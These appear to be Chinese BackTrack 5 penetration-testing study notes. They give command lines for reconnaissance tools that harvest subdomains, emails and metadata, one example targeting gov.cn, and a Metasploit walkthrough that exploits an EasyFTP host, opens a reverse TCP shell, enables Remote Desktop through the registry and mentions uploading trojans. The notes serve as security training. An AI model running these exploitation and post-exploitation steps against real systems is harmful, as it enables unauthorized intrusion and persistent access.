3.2.4 开源工具评估


3.2.4.1 goohost 通过Google Search探测目标子域名；
终端 cd /pentest/enumeration/google/goohost；
路径：BT - Vulnerability Assessment - Web Assessment - Web Open Source Assessment；
输入 ./goohost.sh -t domain [ -m <host/ip/mail> -p <1-20> -v]
参数 -t 指定目标网站，-m 指定方法即host/ip/mail，
-p 从Google Search下载的最大页面数量，-v 详细模式；
输入 vi report-domain.txt 查看保存结果；-m 方法中ip较快，host/mail较慢

3.2.4.2 metagofil 元数据收集工具，需要google，物理机VPN虚拟机NAT模式
终端 cd /pentest/enumeration/google/metagoofil
以gov.cn为例，输入 python metagoofil.py -d gov.cn -t doc -l 50 -n 10 -o goven -f results.html
参数 -l 结果限制 -n 文档数限制 -o 文档保存文件名 -f 保存结果界面；类似工具FOCA Free

3.2.4.3 theharvester 针对子域名/邮箱/用户名等的收集工具，
但由于Google、Bing阻止自动化搜索，所以需要绕过；使用Bing，需要申请Bing API；
路径：BT - Vulnerability Assessment - Web Assessment - Web Open Source Assessment
终端 cd /pentest/enumeration/theharvester；
shell输入 ./theHarvester.py -d domain/ID -l 500 -b all
参数 -d 指定域名/ID -l 指定搜索数量 -b 指定搜索源

4.1 网络漏洞攻击工具

Metasploit 终端 cd /pentest/exploits/framework3/msfconsole
路径：BT - Exploitation Tools - Network Exploitation - Metasploit Framework
每次使用前需要运行路径下msfupdate进行升级；输入“p”，永远接受

例 演示溢出内网一台装有easyftp程序的计算机，被测试机IP 192.168.0.2

环境介绍和设置前的准备：
1.选择路径下msfconsole，启动Metasploit控制台；显示数据库建表信息
2.exploits auxiliary 辅助 post payloads 有效载荷 encoders 编码器 nops
3.msf > search easyftp，返回exploit记录路径
4.选择一个exploit，如exploit/windows/ftp/easyftp_cwd_fixret
5.msf > 路径；显示msf exploit（easyftp_cwd_fixret） > ，运用exploit成功
6.msf exploit（easyftp_cwd_fixret） > info exploit/windows/ftp/easyftp_cwd_fixret
7.查看exploit细节描述；Basic option为exploit利用方式
8.Required值为yes，表示需要参数；RHOST指定目标IP，RPORT指定端口

攻击参数设置，msf exploit（easyftp_cwd_fixret） > ：
1.setg LHOST 192.168.0.4（测试机IP 即本机BT5地址）
2.setg LPORT 4445（本机端口；用以反弹连接）
3.setg PAYLOAD windows/shell/reverse_tcp（执行show payloads查看载荷）
4.setg RHOST 192.168.0.2（被测试机/目标IP）
5.setg RPORT 21（通常用namp确定端口，nessus确定漏洞，metasploit攻击）
6.show targets 9（设置攻击程序版本，实战通常使用namp获得目标软件版本）

设置完毕，开始溢出攻击：
1.输入msf exploit（easyftp_cwd_fixret） > exploit
2.正常情况下，反弹cmd shell；显示目标程序所在目录
3.执行ipconfig查看目标网络信息；执行systeminfo查看目标系统信息
4.开启3389：REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f；上传木马等
